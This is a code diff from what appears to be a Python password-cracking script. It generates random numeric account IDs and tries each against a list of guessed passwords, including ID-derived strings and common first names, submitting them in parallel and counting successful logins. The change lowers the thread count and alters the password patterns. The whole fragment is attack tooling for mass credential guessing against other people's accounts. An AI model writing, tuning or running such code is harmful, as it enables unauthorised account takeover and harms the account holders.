@@ -133,7 +133,7 @@ def MUHIBrndm():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=110) as MUHIB:
+    with ThreadPool(max_workers=30) as MUHIB:
         os.system('clear')
         print(logo)
         tl = str(len(user))
@@ -149,7 +149,7 @@ def MUHIBrndm():
         __muhib__('\033[38;5;46m--------------------------------------------')
         for guru in user:
             uid = tithie+tithiex+tithi+guru
-            pwx = [tithie+tithiex+tithi+guru,tithi+guru,tithiex+guru,tithie+tithiex+tithi,'freefire','@@@###','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
+            pwx = [tithie+tithiex+tithi+guru,kodeb+guru,kode+guru,tithie+tithiex+tithi,'freefire','@@###','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
             MUHIB.submit(rcrack1,uid,pwx,tl)
     print(f'{G}--------------------------------------')
     print(' [×] FINISHED ------\033[1;92mTOTAL OK : %s'%len(oks))
